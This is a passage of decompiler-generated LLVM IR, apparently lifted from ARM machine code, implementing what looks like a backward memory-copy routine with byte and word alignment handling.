  %v5_1538c = icmp slt i32 %v0_15398.pr, -16
  br i1 %v5_1538c, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_15388
  %v6_1538c = load i32, i32* %r1.global-to-local, align 4
  %v7_1538c = add i32 %v6_1538c, -4
  %v8_1538c = inttoptr i32 %v7_1538c to i32*
  %v9_1538c = load i32, i32* %v8_1538c, align 4
  store i32 %v9_1538c, i32* %r3.global-to-local, align 4
  %v10_1538c = add i32 %v6_1538c, -8
  %v11_1538c = inttoptr i32 %v10_1538c to i32*
  %v12_1538c = load i32, i32* %v11_1538c, align 4
  store i32 %v12_1538c, i32* %r4.global-to-local, align 4
  %v13_1538c = add i32 %v6_1538c, -12
  %v14_1538c = inttoptr i32 %v13_1538c to i32*
  %v15_1538c = load i32, i32* %v14_1538c, align 4
  store i32 %v15_1538c, i32* @ip, align 4
  %v16_1538c = add i32 %v6_1538c, -16
  %v17_1538c = inttoptr i32 %v16_1538c to i32*
  %v18_1538c = load i32, i32* %v17_1538c, align 4
  store i32 %v18_1538c, i32* %lr.global-to-local, align 4
  store i32 %v16_1538c, i32* %r1.global-to-local, align 4
  %v7_15390 = add i32 %v6_15390, -16
  %v8_15390 = inttoptr i32 %v7_15390 to i32*
  store i32 %v9_1538c, i32* %v8_15390, align 4
  %v10_15390 = add i32 %v6_15390, -12
  %v11_15390 = inttoptr i32 %v10_15390 to i32*
  %v12_15390 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15390, i32* %v11_15390, align 4
  %v13_15390 = add i32 %v6_15390, -8
  %v14_15390 = inttoptr i32 %v13_15390 to i32*
  %v15_15390 = load i32, i32* @ip, align 4
  store i32 %v15_15390, i32* %v14_15390, align 4
  %v16_15390 = add i32 %v6_15390, -4
  %v17_15390 = inttoptr i32 %v16_15390 to i32*
  %v18_15390 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15390, i32* %v17_15390, align 4
  store i32 %v7_15390, i32* %r0.global-to-local, align 4
  %v6_15394 = load i32, i32* %r2.global-to-local, align 4
  %v7_15394 = add i32 %v6_15394, -16
  store i32 %v7_15394, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_15388, %bb138
  %v6_153a0 = phi i32 [ %v7_15390, %bb138 ], [ %v6_15390, %dec_label_pc_15388 ]
  %v0_15398 = phi i32 [ %v7_15394, %bb138 ], [ %v0_15398.pr, %dec_label_pc_15388 ]
  %v4_15398 = add i32 %v0_15398, 20
  store i32 %v4_15398, i32* %r2.global-to-local, align 4
  %v6_15398 = sub i32 0, %v0_15398
  %v7_15398 = and i32 %v4_15398, %v6_15398
  %v8_15398 = icmp slt i32 %v7_15398, 0
  store i1 %v8_15398, i1* %cpsr_v.global-to-local, align 1
  %v9_15398 = icmp slt i32 %v4_15398, 0
  store i1 %v9_15398, i1* %cpsr_n.global-to-local, align 1
  %v10_15398 = icmp eq i32 %v4_15398, 0
  store i1 %v10_15398, i1* %cpsr_z.global-to-local, align 1
  %v5_1539c = icmp slt i32 %v0_15398, -20
  br i1 %v5_1539c, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_1539c = load i32, i32* %r1.global-to-local, align 4
  %v7_1539c = add i32 %v6_1539c, -4
  %v8_1539c = inttoptr i32 %v7_1539c to i32*
  %v9_1539c = load i32, i32* %v8_1539c, align 4
  store i32 %v9_1539c, i32* %r3.global-to-local, align 4
  %v10_1539c = add i32 %v6_1539c, -8
  %v11_1539c = inttoptr i32 %v10_1539c to i32*
  %v12_1539c = load i32, i32* %v11_1539c, align 4
  store i32 %v12_1539c, i32* @ip, align 4
  %v13_1539c = add i32 %v6_1539c, -12
  %v14_1539c = inttoptr i32 %v13_1539c to i32*
  %v15_1539c = load i32, i32* %v14_1539c, align 4
  store i32 %v15_1539c, i32* %lr.global-to-local, align 4
  store i32 %v13_1539c, i32* %r1.global-to-local, align 4
  %v7_153a0 = add i32 %v6_153a0, -12
  %v8_153a0 = inttoptr i32 %v7_153a0 to i32*
  store i32 %v9_1539c, i32* %v8_153a0, align 4
  %v10_153a0 = add i32 %v6_153a0, -8
  %v11_153a0 = inttoptr i32 %v10_153a0 to i32*
  %v12_153a0 = load i32, i32* @ip, align 4
  store i32 %v12_153a0, i32* %v11_153a0, align 4
  %v13_153a0 = add i32 %v6_153a0, -4
  %v14_153a0 = inttoptr i32 %v13_153a0 to i32*
  %v15_153a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_153a0, i32* %v14_153a0, align 4
  store i32 %v7_153a0, i32* %r0.global-to-local, align 4
  %v6_153a4 = load i32, i32* %r2.global-to-local, align 4
  %v7_153a4 = add i32 %v6_153a4, -12
  store i32 %v7_153a4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_153c456 = phi i32 [ %v6_153a0, %.thread13 ], [ %v7_153a0, %bb139 ]
  %v0_153ac54 = phi i32 [ %v4_15398, %.thread13 ], [ %v7_153a4, %bb139 ]
  %v2_153a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_153a8, i32* @r4, align 4
  store i32 %v6_15364, i32* @lr, align 4
  br label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %dec_label_pc_1535c, %.thread15
  %v7_153bc = phi i32 [ %v0_1537448, %dec_label_pc_1535c ], [ %v6_153c456, %.thread15 ]
  %v0_153ac = phi i32 [ %v2_1535c, %dec_label_pc_1535c ], [ %v0_153ac54, %.thread15 ]
  %v2_153ac = add i32 %v0_153ac, 8
  store i32 %v2_153ac, i32* %r2.global-to-local, align 4
  %v4_153ac = sub i32 0, %v0_153ac
  %v5_153ac = and i32 %v2_153ac, %v4_153ac
  %v6_153ac = icmp slt i32 %v5_153ac, 0
  store i1 %v6_153ac, i1* %cpsr_v.global-to-local, align 1
  %v7_153ac = icmp slt i32 %v2_153ac, 0
  store i1 %v7_153ac, i1* %cpsr_n.global-to-local, align 1
  %v8_153ac = icmp eq i32 %v2_153ac, 0
  store i1 %v8_153ac, i1* %cpsr_z.global-to-local, align 1
  %v5_153b0 = icmp slt i32 %v0_153ac, -8
  br i1 %v5_153b0, label %bb141, label %dec_label_pc_153b4

dec_label_pc_153b4:                               ; preds = %dec_label_pc_153ac
  %v6_153b4 = add i32 %v0_153ac, 4
  store i32 %v6_153b4, i32* %r2.global-to-local, align 4
  %v8_153b4 = sub i32 -5, %v0_153ac
  %v9_153b4 = and i32 %v8_153b4, %v2_153ac
  %v10_153b4 = icmp slt i32 %v9_153b4, 0
  store i1 %v10_153b4, i1* %cpsr_v.global-to-local, align 1
  %v11_153b4 = icmp slt i32 %v6_153b4, 0
  store i1 %v11_153b4, i1* %cpsr_n.global-to-local, align 1
  %v12_153b4 = icmp eq i32 %v2_153ac, 4
  store i1 %v12_153b4, i1* %cpsr_z.global-to-local, align 1
  %v5_153b8 = icmp slt i32 %v2_153ac, 4
  %v6_153b8 = load i32, i32* %r1.global-to-local, align 4
  %v7_153b8 = add i32 %v6_153b8, -4
  %v8_153b8 = inttoptr i32 %v7_153b8 to i32*
  %v9_153b8 = load i32, i32* %v8_153b8, align 4
  store i32 %v9_153b8, i32* %r3.global-to-local, align 4
  br i1 %v5_153b8, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_153b4
  store i32 %v7_153b8, i32* %r1.global-to-local, align 4
  %v8_153bc = add i32 %v7_153bc, -4
  %v9_153bc = inttoptr i32 %v8_153bc to i32*
  store i32 %v9_153b8, i32* %v9_153bc, align 4
  %v10_153bc = load i32, i32* %r0.global-to-local, align 4
  %v11_153bc = add i32 %v10_153bc, -4
  store i32 %v11_153bc, i32* %r0.global-to-local, align 4
  %v0_153cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_153b4
  %v10_153c0 = add i32 %v6_153b8, -8
  %v11_153c0 = inttoptr i32 %v10_153c0 to i32*
  %v12_153c0 = load i32, i32* %v11_153c0, align 4
  store i32 %v12_153c0, i32* @ip, align 4
  store i32 %v10_153c0, i32* %r1.global-to-local, align 4
  %v7_153c4 = add i32 %v7_153bc, -8
  %v8_153c4 = inttoptr i32 %v7_153c4 to i32*
  store i32 %v9_153b8, i32* %v8_153c4, align 4
  %v10_153c4 = add i32 %v7_153bc, -4
  %v11_153c4 = inttoptr i32 %v10_153c4 to i32*
  %v12_153c4 = load i32, i32* @ip, align 4
  store i32 %v12_153c4, i32* %v11_153c4, align 4
  store i32 %v7_153c4, i32* %r0.global-to-local, align 4
  %v6_153c8 = load i32, i32* %r2.global-to-local, align 4
  %v7_153c8 = add i32 %v6_153c8, -4
  store i32 %v7_153c8, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_1533c, %dec_label_pc_153ac, %dec_label_pc_15570, %dec_label_pc_15504, %dec_label_pc_15498, %bb140
  %v2_153d0 = phi i32 [ %v11_153bc, %.thread19 ], [ %v0_1546831, %.thread25 ], [ %v2_15340, %dec_label_pc_1533c ], [ %v7_153bc, %dec_label_pc_153ac ], [ %v2_153dc64, %dec_label_pc_15570 ], [ %v2_153dc63, %dec_label_pc_15504 ], [ %v2_153dc62, %dec_label_pc_15498 ], [ %v7_153c4, %bb140 ]
  %v0_153cc = phi i32 [ %v0_153cc.pre, %.thread19 ], [ %v2_15410, %.thread25 ], [ %v2_15344, %dec_label_pc_1533c ], [ %v2_153ac, %dec_label_pc_153ac ], [ %v0_153cc60, %dec_label_pc_15570 ], [ %v0_153cc59, %dec_label_pc_15504 ], [ %v0_153cc58, %dec_label_pc_15498 ], [ %v7_153c8, %bb140 ]
  %v1_153cc = add i32 %v0_153cc, 4
  store i32 %v1_153cc, i32* %r2.global-to-local, align 4
  %v3_153cc = sub i32 0, %v0_153cc
  %v4_153cc = and i32 %v1_153cc, %v3_153cc
  %v5_153cc = icmp slt i32 %v4_153cc, 0
  store i1 %v5_153cc, i1* %cpsr_v.global-to-local, align 1
  %v6_153cc = icmp slt i32 %v1_153cc, 0
  store i1 %v6_153cc, i1* %cpsr_n.global-to-local, align 1
  %v7_153cc = icmp eq i32 %v1_153cc, 0
  store i1 %v7_153cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_153cc, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_153d4 = add i32 %v0_153cc, 2
  %v3_153d4 = sub i32 -3, %v0_153cc
  %v4_153d4 = and i32 %v3_153d4, %v1_153cc
  %v5_153d4 = icmp slt i32 %v4_153d4, 0
  store i1 %v5_153d4, i1* %cpsr_v.global-to-local, align 1
  %v6_153d4 = icmp slt i32 %v1_153d4, 0
  store i1 %v6_153d4, i1* %cpsr_n.global-to-local, align 1
  %v7_153d4 = icmp eq i32 %v1_153cc, 2
  store i1 %v7_153d4, i1* %cpsr_z.global-to-local, align 1
  %v0_153d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_153d8 = add i32 %v0_153d8, -1
  %v2_153d8 = inttoptr i32 %v1_153d8 to i8*
  %v3_153d8 = load i8, i8* %v2_153d8, align 1
  %v4_153d8 = zext i8 %v3_153d8 to i32
  store i32 %v4_153d8, i32* %r3.global-to-local, align 4
  store i32 %v1_153d8, i32* %r1.global-to-local, align 4
  %v3_153dc = add i32 %v2_153d0, -1
  %v4_153dc = inttoptr i32 %v3_153dc to i8*
  store i8 %v3_153d8, i8* %v4_153dc, align 1
  %v5_153dc = load i32, i32* %r0.global-to-local, align 4
  %v6_153dc = add i32 %v5_153dc, -1
  store i32 %v6_153dc, i32* %r0.global-to-local, align 4
  %v0_153e0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_153e0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_153e0 = xor i1 %v0_153e0, %v1_153e0
  br i1 %v2_153e0, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_153e0 = load i32, i32* %r1.global-to-local, align 4
  %v4_153e0 = add i32 %v3_153e0, -1
  %v5_153e0 = inttoptr i32 %v4_153e0 to i8*
  %v6_153e0 = load i8, i8* %v5_153e0, align 1
  %v7_153e0 = zext i8 %v6_153e0 to i32
  store i32 %v7_153e0, i32* %r3.global-to-local, align 4
  store i32 %v4_153e0, i32* %r1.global-to-local, align 4
  %v6_153e4 = add i32 %v5_153dc, -2
  %v7_153e4 = inttoptr i32 %v6_153e4 to i8*
  store i8 %v6_153e0, i8* %v7_153e4, align 1
  %v8_153e4 = load i32, i32* %r0.global-to-local, align 4
  %v9_153e4 = add i32 %v8_153e4, -1
  store i32 %v9_153e4, i32* %r0.global-to-local, align 4
  %v1_153e8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_153e8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_153ec = phi i32 [ %v9_153e4, %bb143 ], [ %v6_153dc, %bb142 ]
  %v2_153ec = phi i1 [ %v2_153e8.pre, %bb143 ], [ %v1_153e0, %bb142 ]
  %v1_153ec = phi i1 [ %v1_153e8.pre, %bb143 ], [ %v0_153e0, %bb142 ]
  %v0_153e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_153e8 = xor i1 %v2_153ec, %v1_153ec
  %v4_153e8 = or i1 %v0_153e8, %v3_153e8
  br i1 %v4_153e8, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_153e8 = load i32, i32* %r1.global-to-local, align 4
  %v6_153e8 = add i32 %v5_153e8, -1
  %v7_153e8 = inttoptr i32 %v6_153e8 to i8*
  %v8_153e8 = load i8, i8* %v7_153e8, align 1
  %v9_153e8 = zext i8 %v8_153e8 to i32
  store i32 %v9_153e8, i32* %r3.global-to-local, align 4
  store i32 %v6_153e8, i32* %r1.global-to-local, align 4
  %v8_153ec = add i32 %v7_153ec, -1
  %v9_153ec = inttoptr i32 %v8_153ec to i8*
  store i8 %v8_153e8, i8* %v9_153ec, align 1
  %v10_153ec = load i32, i32* %r0.global-to-local, align 4
  %v11_153ec = add i32 %v10_153ec, -1
  store i32 %v11_153ec, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_153f4:                               ; preds = %dec_label_pc_1534c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_153f4 = icmp eq i32 %v1_1534c, 1
  store i1 %v8_153f4, i1* %cpsr_n.global-to-local, align 1
  %v9_153f4 = icmp eq i32 %v1_1534c, 2
  store i1 %v9_153f4, i1* %cpsr_z.global-to-local, align 1
  %v1_153f8 = add i32 %v2_1533c, -1
  %v2_153f8 = inttoptr i32 %v1_153f8 to i8*
  %v3_153f8 = load i8, i8* %v2_153f8, align 1
  %v4_153f8 = zext i8 %v3_153f8 to i32
  store i32 %v4_153f8, i32* %r3.global-to-local, align 4
  store i32 %v1_153f8, i32* %r1.global-to-local, align 4
  %v3_153fc = add i32 %v2_15340, -1
  %v4_153fc = inttoptr i32 %v3_153fc to i8*
  store i8 %v3_153f8, i8* %v4_153fc, align 1
  %v5_153fc = load i32, i32* %r0.global-to-local, align 4
  %v6_153fc = add i32 %v5_153fc, -1
  store i32 %v6_153fc, i32* %r0.global-to-local, align 4
  br i1 %v8_153f4, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_153f4
  %v6_15400 = load i32, i32* %r1.global-to-local, align 4
  %v7_15400 = add i32 %v6_15400, -1
  %v8_15400 = inttoptr i32 %v7_15400 to i8*
  %v9_15400 = load i8, i8* %v8_15400, align 1
  %v10_15400 = zext i8 %v9_15400 to i32
  store i32 %v10_15400, i32* %r3.global-to-local, align 4
  store i32 %v7_15400, i32* %r1.global-to-local, align 4
  %v9_15404 = add i32 %v5_153fc, -2
  %v10_15404 = inttoptr i32 %v9_15404 to i8*
  store i8 %v9_15400, i8* %v10_15404, align 1
  %v11_15404 = load i32, i32* %r0.global-to-local, align 4
  %v12_15404 = add i32 %v11_15404, -1
  store i32 %v12_15404, i32* %r0.global-to-local, align 4
  br i1 %v9_153f4, label %.thread25, label %bb146

bb146:                                            ; preds = %bb145
  %v8_15408 = load i32, i32* %r1.global-to-local, align 4
  %v9_15408 = add i32 %v8_15408, -1
  %v10_15408 = inttoptr i32 %v9_15408 to i8*
  %v11_15408 = load i8, i8* %v10_15408, align 1
  %v12_15408 = zext i8 %v11_15408 to i32
  store i32 %v12_15408, i32* %r3.global-to-local, align 4
  store i32 %v9_15408, i32* %r1.global-to-local, align 4
  %v11_1540c = add i32 %v11_15404, -2
  %v12_1540c = inttoptr i32 %v11_1540c to i8*
  store i8 %v11_15408, i8* %v12_1540c, align 1
  %v13_1540c = load i32, i32* %r0.global-to-local, align 4
  %v14_1540c = add i32 %v13_1540c, -1
  store i32 %v14_1540c, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_153f4, %bb146
  %v0_1546831 = phi i32 [ %v12_15404, %bb145 ], [ %v6_153fc, %dec_label_pc_153f4 ], [ %v14_1540c, %bb146 ]
  %v0_15410 = load i32, i32* %r2.global-to-local, align 4
  %v1_15410 = load i32, i32* @ip, align 4
  %v2_15410 = sub i32 %v0_15410, %v1_15410
  store i32 %v2_15410, i32* %r2.global-to-local, align 4
  %v4_15410 = xor i32 %v1_15410, %v0_15410
  %v5_15410 = xor i32 %v2_15410, %v0_15410
  %v6_15410 = and i32 %v5_15410, %v4_15410
  %v7_15410 = icmp slt i32 %v6_15410, 0
  store i1 %v7_15410, i1* %cpsr_v.global-to-local, align 1
  %v8_15410 = icmp slt i32 %v2_15410, 0
  store i1 %v8_15410, i1* %cpsr_n.global-to-local, align 1
  %v9_15410 = icmp eq i32 %v0_15410, %v1_15410
  store i1 %v9_15410, i1* %cpsr_z.global-to-local, align 1
  %v5_15414 = icmp slt i32 %v0_15410, %v1_15410
  br i1 %v5_15414, label %bb141, label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %.thread25
  %v0_15418 = load i32, i32* %r1.global-to-local, align 4
  %v1_15418 = urem i32 %v0_15418, 4
  store i32 %v1_15418, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15418 = icmp eq i32 %v1_15418, 0
  store i1 %v2_15418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15418, label %dec_label_pc_1535c, label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_15354, %dec_label_pc_15418
  %v0_1546830 = phi i32 [ %v2_15340, %dec_label_pc_15354 ], [ %v0_1546831, %dec_label_pc_15418 ]
  %v0_15514 = phi i32 [ %v2_15344, %dec_label_pc_15354 ], [ %v2_15410, %dec_label_pc_15418 ]
  %v0_15420 = phi i32 [ %v2_1533c, %dec_label_pc_15354 ], [ %v0_15418, %dec_label_pc_15418 ]
  %v0_15428 = phi i32 [ %v1_15354, %dec_label_pc_15354 ], [ %v1_15418, %dec_label_pc_15418 ]
  %v1_15420 = and i32 %v0_15420, -4
  store i32 %v1_15420, i32* %r1.global-to-local, align 4
  %v1_15424 = inttoptr i32 %v1_15420 to i32*
  %v2_15424 = load i32, i32* %v1_15424, align 4
  store i32 %v2_15424, i32* %r3.global-to-local, align 4
  %v7_15428 = icmp ult i32 %v0_15428, 2
  %v2_1550c = add i32 %v0_15514, -12
  %v4_1550c = sub i32 11, %v0_15514
  %v5_1550c = and i32 %v4_1550c, %v0_15514
  %v6_1550c = icmp slt i32 %v5_1550c, 0
  store i1 %v6_1550c, i1* %cpsr_v.global-to-local, align 1
  %v7_1550c = icmp slt i32 %v2_1550c, 0
  store i1 %v7_1550c, i1* %cpsr_n.global-to-local, align 1
  %v8_1550c = icmp eq i32 %v0_15514, 12
  store i1 %v8_1550c, i1* %cpsr_z.global-to-local, align 1
  %v5_15510 = icmp slt i32 %v0_15514, 12
  br i1 %v7_15428, label %dec_label_pc_1550c, label %dec_label_pc_15430

dec_label_pc_15430:                               ; preds = %dec_label_pc_15420
  %v8_15428 = icmp eq i32 %v0_15428, 2
  br i1 %v8_15428, label %dec_label_pc_154a0, label %dec_label_pc_15434

dec_label_pc_15434:                               ; preds = %dec_label_pc_15430
  br i1 %v5_15510, label %dec_label_pc_15480, label %dec_label_pc_1543c

dec_label_pc_1543c:                               ; preds = %dec_label_pc_15434
  store i32 %v2_1550c, i32* %r2.global-to-local, align 4
  %v3_15440 = load i32, i32* @r4, align 4
  store i32 %v3_15440, i32* %stack_var_-12, align 4
  %v6_15440 = load i32, i32* @r5, align 4
  store i32 %v6_15440, i32* %stack_var_-8, align 4
  %v9_15440 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_15444.dec_label_pc_15444_crit_edge, %dec_label_pc_1543c
  %v0_15468 = phi i32 [ %v1_15468, %dec_label_pc_15444.dec_label_pc_15444_crit_edge ], [ %v0_1546830, %dec_label_pc_1543c ]
  %v0_15448 = phi i32 [ %v0_15448.pre, %dec_label_pc_15444.dec_label_pc_15444_crit_edge ], [ %v1_15420, %dec_label_pc_1543c ]
  %v0_15444 = phi i32 [ %v0_15444.pre, %dec_label_pc_15444.dec_label_pc_15444_crit_edge ], [ %v2_15424, %dec_label_pc_1543c ]
  %v3_15444 = mul i32 %v0_15444, 256
  store i32 %v3_15444, i32* %lr.global-to-local, align 4
  %v1_15448 = add i32 %v0_15448, -4
  %v2_15448 = inttoptr i32 %v1_15448 to i32*
  %v3_15448 = load i32, i32* %v2_15448, align 4
  store i32 %v3_15448, i32* %r3.global-to-local, align 4
  %v4_15448 = add i32 %v0_15448, -8
  %v5_15448 = inttoptr i32 %v4_15448 to i32*
  %v6_15448 = load i32, i32* %v5_15448, align 4
  store i32 %v6_15448, i32* %r4.global-to-local, align 4
  %v7_15448 = add i32 %v0_15448, -12
  %v8_15448 = inttoptr i32 %v7_15448 to i32*
  %v9_15448 = load i32, i32* %v8_15448, align 4
  store i32 %v9_15448, i32* %r5.global-to-local, align 4
  %v10_15448 = add i32 %v0_15448, -16
  %v11_15448 = inttoptr i32 %v10_15448 to i32*
  %v12_15448 = load i32, i32* %v11_15448, align 4
  store i32 %v10_15448, i32* %r1.global-to-local, align 4
  %v4_1544c = udiv i32 %v12_15448, 16777216
  %v5_1544c = or i32 %v4_1544c, %v3_15444
  store i32 %v5_1544c, i32* %lr.global-to-local, align 4
  %v3_15450 = mul i32 %v12_15448, 256
  %v4_15454 = udiv i32 %v9_15448, 16777216
  %v5_15454 = or i32 %v3_15450, %v4_15454
  store i32 %v5_15454, i32* @ip, align 4
  %v3_15458 = mul i32 %v9_15448, 256
  %v4_1545c = udiv i32 %v6_15448, 16777216
  %v5_1545c = or i32 %v3_15458, %v4_1545c
  store i32 %v5_1545c, i32* %r5.global-to-local, align 4
  %v3_15460 = mul i32 %v6_15448, 256
  %v4_15464 = udiv i32 %v3_15448, 16777216
  %v5_15464 = or i32 %v3_15460, %v4_15464
  store i32 %v5_15464, i32* %r4.global-to-local, align 4
  %v1_15468 = add i32 %v0_15468, -16
  %v2_15468 = inttoptr i32 %v1_15468 to i32*
  store i32 %v5_15464, i32* %v2_15468, align 4
  %v4_15468 = add i32 %v0_15468, -12
  %v5_15468 = inttoptr i32 %v4_15468 to i32*
  %v6_15468 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15468, i32* %v5_15468, align 4
  %v7_15468 = add i32 %v0_15468, -8
  %v8_15468 = inttoptr i32 %v7_15468 to i32*
  %v9_15468 = load i32, i32* @ip, align 4
  store i32 %v9_15468, i32* %v8_15468, align 4
  %v10_15468 = add i32 %v0_15468, -4
  %v11_15468 = inttoptr i32 %v10_15468 to i32*
  %v12_15468 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15468, i32* %v11_15468, align 4
  store i32 %v1_15468, i32* %r0.global-to-local, align 4
  %v0_1546c = load i32, i32* %r2.global-to-local, align 4
  %v2_1546c = add i32 %v0_1546c, -16
  store i32 %v2_1546c, i32* %r2.global-to-local, align 4
  %v6_15470 = icmp slt i32 %v0_1546c, 16
  br i1 %v6_15470, label %dec_label_pc_15474, label %dec_label_pc_15444.dec_label_pc_15444_crit_edge

dec_label_pc_15444.dec_label_pc_15444_crit_edge:  ; preds = %dec_label_pc_15444
  %v0_15444.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15448.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15444

dec_label_pc_15474:                               ; preds = %dec_label_pc_15444
  %v2_15474 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15474, i32* @r4, align 4
  %v5_15474 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15474, i32* @r5, align 4
  store i32 %v9_15440, i32* @lr, align 4
  %v2_15478 = add i32 %v0_1546c, -4
  store i32 %v2_15478, i32* %r2.global-to-local, align 4
  %v4_15478 = add i32 %v0_1546c, 2147483632
  %v5_15478 = and i32 %v2_15478, %v4_15478
  %v6_15478 = icmp slt i32 %v5_15478, 0
  store i1 %v6_15478, i1* %cpsr_v.global-to-local, align 1
  %v7_15478 = icmp slt i32 %v2_15478, 0
  store i1 %v7_15478, i1* %cpsr_n.global-to-local, align 1
  %v8_15478 = icmp eq i32 %v2_15478, 0
  store i1 %v8_15478, i1* %cpsr_z.global-to-local, align 1
  %v5_1547c = icmp slt i32 %v2_1546c, -12
  br i1 %v5_1547c, label %dec_label_pc_15498, label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %dec_label_pc_15474, %dec_label_pc_15434, %dec_label_pc_15480
  %v1_1548c = phi i32 [ %v5_1548c, %dec_label_pc_15480 ], [ %v1_15468, %dec_label_pc_15474 ], [ %v0_1546830, %dec_label_pc_15434 ]
  %v0_15480 = load i32, i32* %r3.global-to-local, align 4
  %v3_15480 = mul i32 %v0_15480, 256
  store i32 %v3_15480, i32* %ip.global-to-local, align 4
  %v0_15484 = load i32, i32* %r1.global-to-local, align 4
  %v1_15484 = add i32 %v0_15484, -4
  %v2_15484 = inttoptr i32 %v1_15484 to i32*
  %v3_15484 = load i32, i32* %v2_15484, align 4
  store i32 %v3_15484, i32* %r3.global-to-local, align 4
  store i32 %v1_15484, i32* %r1.global-to-local, align 4
  %v4_15488 = udiv i32 %v3_15484, 16777216
  %v5_15488 = or i32 %v4_15488, %v3_15480
  store i32 %v5_15488, i32* @ip, align 4
  %v2_1548c = add i32 %v1_1548c, -4
  %v3_1548c = inttoptr i32 %v2_1548c to i32*
  store i32 %v5_15488, i32* %v3_1548c, align 4
  %v4_1548c = load i32, i32* %r0.global-to-local, align 4
  %v5_1548c = add i32 %v4_1548c, -4
  store i32 %v5_1548c, i32* %r0.global-to-local, align 4
  %v0_15490 = load i32, i32* %r2.global-to-local, align 4
  %v2_15490 = add i32 %v0_15490, -4
  store i32 %v2_15490, i32* %r2.global-to-local, align 4
  %v6_15494 = icmp slt i32 %v0_15490, 4
  br i1 %v6_15494, label %dec_label_pc_15498.loopexit, label %dec_label_pc_15480

dec_label_pc_15498.loopexit:                      ; preds = %dec_label_pc_15480
  %v4_15490 = sub i32 3, %v0_15490
  %v5_15490 = and i32 %v4_15490, %v0_15490
  %v6_15490 = icmp slt i32 %v5_15490, 0
  %v7_15490 = icmp slt i32 %v2_15490, 0
  store i1 %v6_15490, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15490, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15498.loopexit, %dec_label_pc_15474
  %v2_153dc62 = phi i32 [ %v5_1548c, %dec_label_pc_15498.loopexit ], [ %v1_15468, %dec_label_pc_15474 ]
  %v0_153cc58 = phi i32 [ %v2_15490, %dec_label_pc_15498.loopexit ], [ %v2_15478, %dec_label_pc_15474 ]
  %v0_15498 = load i32, i32* %r1.global-to-local, align 4
  %v1_15498 = add i32 %v0_15498, 3
  store i32 %v1_15498, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15430
  br i1 %v5_15510, label %dec_label_pc_154ec, label %dec_label_pc_154a8

dec_label_pc_154a8:                               ; preds = %dec_label_pc_154a0
  store i32 %v2_1550c, i32* %r2.global-to-local, align 4
  %v3_154ac = load i32, i32* @r4, align 4
  store i32 %v3_154ac, i32* %stack_var_-12, align 4
  %v6_154ac = load i32, i32* @r5, align 4
  store i32 %v6_154ac, i32* %stack_var_-8, align 4
  %v9_154ac = load i32, i32* @lr, align 4
  br label %dec_label_pc_154b0

dec_label_pc_154b0:                               ; preds = %dec_label_pc_154b0.dec_label_pc_154b0_crit_edge, %dec_label_pc_154a8
  %v0_154d4 = phi i32 [ %v1_154d4, %dec_label_pc_154b0.dec_label_pc_154b0_crit_edge ], [ %v0_1546830, %dec_label_pc_154a8 ]
  %v0_154b4 = phi i32 [ %v0_154b4.pre, %dec_label_pc_154b0.dec_label_pc_154b0_crit_edge ], [ %v1_15420, %dec_label_pc_154a8 ]
  %v0_154b0 = phi i32 [ %v0_154b0.pre, %dec_label_pc_154b0.dec_label_pc_154b0_crit_edge ], [ %v2_15424, %dec_label_pc_154a8 ]
  %v3_154b0 = mul i32 %v0_154b0, 65536
  store i32 %v3_154b0, i32* %lr.global-to-local, align 4
  %v1_154b4 = add i32 %v0_154b4, -4
  %v2_154b4 = inttoptr i32 %v1_154b4 to i32*
  %v3_154b4 = load i32, i32* %v2_154b4, align 4
  store i32 %v3_154b4, i32* %r3.global-to-local, align 4
  %v4_154b4 = add i32 %v0_154b4, -8
  %v5_154b4 = inttoptr i32 %v4_154b4 to i32*
  %v6_154b4 = load i32, i32* %v5_154b4, align 4
